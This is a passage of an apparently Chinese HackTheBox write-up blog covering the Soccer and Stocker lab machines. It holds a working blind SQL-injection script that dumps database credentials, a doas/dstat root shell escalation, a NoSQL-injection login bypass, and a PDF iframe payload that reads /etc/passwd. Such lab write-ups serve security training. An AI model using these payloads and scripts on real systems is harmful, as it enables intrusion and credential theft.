* 16777215).toString(16);</span></span><br><span class="line"><span class="comment">// p.style.color = randomColor;</span></span><br><span class="line">p.textContent = msg</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地console进行测试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>);</span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;<span class="built_in">console</span>.log(e.data)&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws.send(JSON.stringify(&#123;&quot;id&quot;: &quot;0&quot;&#125;));</span><br><span class="line">Ticket Doesn&#39;t Exist</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws.send(JSON.stringify(&#123;&quot;id&quot;: &quot;0 or 1&quot;&#125;));</span><br><span class="line">Ticket Exists</span><br></pre></td></tr></table></figure><p>存在SQL注入漏洞</p><p>二分法布尔注入</p><blockquote><p>pip install websocket-client</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">ws, message</span>):</span></span><br><span class="line"><span class="keyword">global</span> result</span><br><span class="line">result = message  <span class="comment"># handle the received message here</span></span><br><span class="line">ws.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_error</span>(<span class="params">ws, error</span>):</span></span><br><span class="line">print(error)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_close</span>(<span class="params">ws</span>):</span></span><br><span class="line">print(<span class="string">&quot;Closed connection&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_open</span>(<span class="params">ws</span>):</span></span><br><span class="line"><span class="keyword">global</span> send_data</span><br><span class="line">ws.send(json.dumps(send_data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">websocket.enableTrace(<span class="literal">False</span>)  <span class="comment"># enable trace for debugging purposes</span></span><br><span class="line">ws = websocket.WebSocketApp(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>,</span><br><span class="line">on_message=on_message,</span><br><span class="line">on_error=on_error,</span><br><span class="line">on_close=on_close)</span><br><span class="line">ws.on_open = on_open</span><br><span class="line">ws.run_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">version</span>():</span></span><br><span class="line">pos = <span class="number">1</span></span><br><span class="line">response = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">bot = <span class="number">0</span></span><br><span class="line">top = <span class="number">128</span></span><br><span class="line">mid = (bot + top) // <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span>(bot &lt; top):</span><br><span class="line"><span class="keyword">global</span> send_data</span><br><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr(@@version,%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br><span class="line">print(send_data)</span><br><span class="line">run()</span><br><span class="line"><span class="keyword">if</span> result == <span class="string">&quot;Ticket Exists&quot;</span>:</span><br><span class="line">bot = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">top = mid</span><br><span class="line">mid = (bot + top) // <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span>(mid == <span class="number">0</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos += <span class="number">1</span></span><br><span class="line">response = response + <span class="built_in">chr</span>(mid)</span><br><span class="line">print(response)</span><br><span class="line"><span class="keyword">if</span> mid == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">version()</span><br></pre></td></tr></table></figure><p>得到版本信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.0.31-0ubuntu0.20.04.2</span><br></pre></td></tr></table></figure><p>查询用户信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select user()),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure><p>用户信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">player@localhost</span><br></pre></td></tr></table></figure><p>查询库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure><p>库名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql,information_schema,performance_scqema,sys,soccer_db</span><br></pre></td></tr></table></figure><p>查询user表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select group_concat(user, &#x27;:&#x27; ,password) from mysql.user),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure><p>user表如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debian-sys-maint:PlayerOftheMatch2022,mysql.infoschema:PlayerOftheMatch2022,mysql.session:PlayerOftheMatch2022,mysql.sys:PlayerOftheMatch2022,player:PlayerOftheMatch2022,root:PlayerOftheMatch2022</span><br></pre></td></tr></table></figure><p>SSH登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh player@10.10.11.194</span><br><span class="line">PlayerOftheMatch2022</span><br></pre></td></tr></table></figure><p>查看user.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;player&#x2F;user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">71661caf8fd27d4777ef94f5ae4cfea5</span><br></pre></td></tr></table></figure><h2 id="权限提升-21"><a class="markdownIt-Anchor" href="#权限提升-21"></a> 权限提升</h2><p>查询SUID文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;doas</span><br></pre></td></tr></table></figure><p>查看doas配置信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/<span class="built_in">local</span>/etc/doas.conf </span><br><span class="line">permit nopass player as root cmd /usr/bin/dstat</span><br></pre></td></tr></table></figure><p><code>/usr/local/bin/doas</code>, <code>/usr/local/bin/vidoas</code><br />这两个程序都能给出配置信息的路径，前者需要IDA简略分析，后者运行即可得知</p><blockquote><p>There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf – <a href="https://0x1.gitlab.io/exploit/Linux-Privilege-Escalation/">https://0x1.gitlab.io/exploit/Linux-Privilege-Escalation/</a></p></blockquote><p>意思就是把这个doas当成sudo来处理</p><p>添加dstat配置文件并调用即可提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import os; os.execv(&quot;/bin/sh&quot;, [&quot;sh&quot;])&#x27;</span> &gt; /usr/<span class="built_in">local</span>/share/dstat/dstat_BFL.py</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/doas -u root /usr/bin/dstat --BFL</span><br></pre></td></tr></table></figure><p>查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">53d6af62fd48af558d4bd82282e5c668</span><br></pre></td></tr></table></figure><hr /><blockquote><p>错误方法，正确答案</p></blockquote><p>当时查出来的user表看着很怪，但是还是能登入player账户（获取WebShell之后可以看<code>/etc/passwd</code>或者<code>/home/</code>得知player用户的存在），就没去看soccer_db了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select user, password from mysql.user;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;password&#39; in &#39;field list&#39;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /root/app/server.js</span><br><span class="line">...</span><br><span class="line">const query = `Select id,username,password  FROM accounts <span class="built_in">where</span> id = <span class="variable">$&#123;id&#125;</span>`;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from soccer_db.accounts;</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br><span class="line">| id   | email             | username | password             |</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br><span class="line">| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |</span><br><span class="line">+------+-------------------+----------+----------------------+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select user from mysql.user;</span><br><span class="line">+------------------+</span><br><span class="line">| user             |</span><br><span class="line">+------------------+</span><br><span class="line">| debian-sys-maint |</span><br><span class="line">| mysql.infoschema |</span><br><span class="line">| mysql.session    |</span><br><span class="line">| mysql.sys        |</span><br><span class="line">| player           |</span><br><span class="line">| root             |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><hr /><h1 id="hackthebox_stocker"><a class="markdownIt-Anchor" href="#hackthebox_stocker"></a> HackTheBox_Stocker</h1><h2 id="信息收集-6"><a class="markdownIt-Anchor" href="#信息收集-6"></a> 信息收集</h2><h3 id="端口扫描-23"><a class="markdownIt-Anchor" href="#端口扫描-23"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.196</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.196</span><br><span class="line">Host is up (1.7s latency).</span><br><span class="line">Not shown: 528 closed ports, 470 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举-4"><a class="markdownIt-Anchor" href="#路径枚举-4"></a> 路径枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I http://10.10.11.196/</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Tue, 07 Mar 2023 11:42:59 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 178</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;stocker.htb</span><br></pre></td></tr></table></figure><p>跳转至域名<code>stocker.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.196\tstocker.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>枚举路径未得到有效信息</p><h3 id="vhost"><a class="markdownIt-Anchor" href="#vhost"></a> VHOST</h3><p>生成VHOST列表</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vhost.py</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/usr/share/wordlists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt&quot;</span>)</span><br><span class="line">data = file.read().split()</span><br><span class="line">file.close()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> data:</span><br><span class="line">print(<span class="string">&quot;10.10.11.196\t%s.stocker.htb&quot;</span> % _)</span><br></pre></td></tr></table></figure><p>备份hosts文件并生成新hosts文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/hosts /etc/hosts.bak</span><br><span class="line">python vhost.py &gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>VHOST扫描程序如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># scan.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/etc/hosts&quot;</span>)</span><br><span class="line">data_list = file.read().replace(<span class="string">&quot;10.10.11.196\t&quot;</span>, <span class="string">&quot;&quot;</span>).split()</span><br><span class="line">file.close()</span><br><span class="line">req = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> index</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enum</span>():</span></span><br><span class="line"><span class="keyword">global</span> index</span><br><span class="line"><span class="keyword">while</span> index &lt; <span class="built_in">len</span>(data_list):</span><br><span class="line">tmp_vhost = data_list[index]</span><br><span class="line">index += <span class="number">1</span></span><br><span class="line">print(index)</span><br><span class="line">res = req.get(<span class="string">&quot;http://%s/&quot;</span> % tmp_vhost, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Location&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.headers <span class="keyword">or</span> res.headers[<span class="string">&quot;Location&quot;</span>] != <span class="string">&quot;http://stocker.htb&quot;</span>:</span><br><span class="line">print(tmp_vhost)</span><br><span class="line"></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">t = threading.Thread(target=enum)</span><br><span class="line">threads.append(t)</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">t.join()</span><br></pre></td></tr></table></figure><p>扫描得到VHOST信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dev.stocker.htb</span><br></pre></td></tr></table></figure><p>还原hosts文件并添加hosts信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;etc&#x2F;hosts</span><br><span class="line">mv &#x2F;etc&#x2F;hosts.bak &#x2F;etc&#x2F;hosts</span><br><span class="line">echo -e &quot;10.10.11.196\tdev.stocker.htb&quot; &gt; &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-21"><a class="markdownIt-Anchor" href="#漏洞利用-21"></a> 漏洞利用</h2><p>访问<code>dev.stocker.htb</code></p><blockquote><p><a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql">https://book.hacktricks.xyz/pentesting-web/nosql-injection#blind-nosql</a></p></blockquote><p>NoSQL注入绕过登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb/login --json <span class="string">&#x27;&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#x27;</span> -v</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">* Connected to dev.stocker.htb (154.38.66.218) port 80 (#0)</span><br><span class="line">&gt; POST &#x2F;login HTTP&#x2F;1.1</span><br><span class="line">&gt; Host: dev.stocker.htb</span><br><span class="line">&gt; User-Agent: curl&#x2F;7.87.0</span><br><span class="line">&gt; Content-Type: application&#x2F;json</span><br><span class="line">&gt; Accept: application&#x2F;json</span><br><span class="line">&gt; Content-Length: 55</span><br><span class="line">&gt; </span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP&#x2F;1.1 302 Found</span><br><span class="line">&lt; Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">&lt; Date: Tue, 07 Mar 2023 14:16:51 GMT</span><br><span class="line">&lt; Content-Length: 0</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; X-Powered-By: Express</span><br><span class="line">&lt; Location: &#x2F;stock</span><br><span class="line">&lt; Vary: Accept</span><br><span class="line">&lt; Set-Cookie: connect.sid&#x3D;s%3AfJIaR20mVzvQQCGTeOLbI_uzbKaqBhDQ.1iY7jjKTmOGErnDSTPrCaAgRhmuV8m0NpczGe67RCfg; Path&#x3D;&#x2F;; HttpOnly</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host dev.stocker.htb left intact</span><br></pre></td></tr></table></figure><p>商品加入购物车并支付后生成订单PDF文件<br />下载后查看exif信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool 64074bcafc5e45f83e5036a5.pdf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : 12.49</span><br><span class="line">File Name                       : 64074bcafc5e45f83e5036a5.pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 39 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2023:03:07 09:36:19-05:00</span><br><span class="line">File Access Date&#x2F;Time           : 2023:03:07 09:36:31-05:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2023:03:07 09:36:32-05:00</span><br><span class="line">File Permissions                : -rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application&#x2F;pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 1</span><br><span class="line">Tagged PDF                      : Yes</span><br><span class="line">Creator                         : Chromium</span><br><span class="line">Producer                        : Skia&#x2F;PDF m108</span><br><span class="line">Create Date                     : 2023:03:07 14:36:05+00:00</span><br><span class="line">Modify Date                     : 2023:03:07 14:36:05+00:00</span><br></pre></td></tr></table></figure><p>Skia/PDF XSS to SSRF</p><blockquote><p><a href="https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file">https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file</a></p></blockquote><p>修改订单信息如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;basket&quot;</span>:[&#123;</span><br><span class="line"><span class="attr">&quot;_id&quot;</span>:<span class="string">&quot;638f116eeb060210cbd83a8d&quot;</span>,</span><br><span class="line"><span class="attr">&quot;title&quot;</span>:<span class="string">&quot;&lt;iframe style=&#x27;width: 1000px;height: 1000px;&#x27; src=file:///etc/passwd&gt; &quot;</span>,</span><br><span class="line"><span class="attr">&quot;description&quot;</span>:<span class="string">&quot;It&#x27;s a red cup.&quot;</span>,</span><br><span class="line"><span class="attr">&quot;image&quot;</span>:<span class="string">&quot;red-cup.jpg../../../../../../etc/passwd&quot;</span>,</span><br><span class="line"><span class="attr">&quot;price&quot;</span>:<span class="number">-1</span>,</span><br><span class="line"><span class="attr">&quot;currentStock&quot;</span>:<span class="number">4</span>,</span><br><span class="line"><span class="attr">&quot;__v&quot;</span>:<span class="number">0</span>,</span><br><span class="line"><span class="attr">&quot;amount&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成订单PDF文件即可触发SSRF漏洞并获取/etc/passwd信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span 